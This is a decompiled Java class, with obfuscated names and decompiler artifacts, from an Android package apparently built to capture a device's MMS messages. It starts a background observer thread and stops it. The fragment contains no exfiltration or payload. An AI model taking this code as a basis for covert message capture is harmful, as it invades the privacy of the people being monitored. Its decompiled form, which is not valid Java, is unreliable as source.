package com.vvt.capture.mms.b;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.os.Looper;
import com.vvt.ak.a;
import com.vvt.base.capture.f;
import com.vvt.base.capture.i;

public class b
  implements com.vvt.base.capture.e
{
  private static final boolean a = a.a;
  private ContentObserver b;
  private ContentResolver c;
  private Looper d;
  private Thread e;
  private Object f;
  private f g;
  private boolean h;
  private long i;
  
  public b(ContentResolver paramContentResolver, f paramf, boolean paramBoolean, long paramLong)
  {
    Object localObject = new java/lang/Object;
    localObject.<init>();
    this.f = localObject;
    this.c = paramContentResolver;
    this.g = paramf;
    this.h = paramBoolean;
    this.i = paramLong;
  }
  
  private boolean a()
  {
    boolean bool1 = this.h;
    Object localObject;
    long l1;
    boolean bool2;
    long l2;
    if (bool1)
    {
      localObject = (com.vvt.capture.mms.a.b)this.g;
      l1 = this.i;
      bool2 = ((com.vvt.capture.mms.a.b)localObject).a(l1);
      if (bool2)
      {
        l2 = ((com.vvt.capture.mms.a.b)localObject).c();
        this.i = l2;
      }
    }
    for (bool1 = bool2;; bool1 = bool2)
    {
      bool2 = a;
      if (bool2) {}
      return bool1;
      localObject = (e)this.g;
      l1 = this.i;
      bool2 = ((e)localObject).a(l1);
      if (bool2)
      {
        l2 = ((e)localObject).c();
        this.i = l2;
      }
    }
  }
  
  public void a(i parami)
  {
    Object localObject = this.e;
    if (localObject == null)
    {
      localObject = new com/vvt/capture/mms/b/c;
      String str = "MmsOT";
      ((c)localObject).<init>(this, str, parami);
      this.e = ((Thread)localObject);
      localObject = this.e;
      ((Thread)localObject).start();
    }
  }
  
  public void b()
  {
    Object localObject = this.c;
    if (localObject != null)
    {
      localObject = this.b;
      if (localObject != null)
      {
        localObject = this.c;
        ContentObserver localContentObserver = this.b;
        ((ContentResolver)localObject).unregisterContentObserver(localContentObserver);
      }
    }
    localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((Looper)localObject).quit();
    }
    this.e = null;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */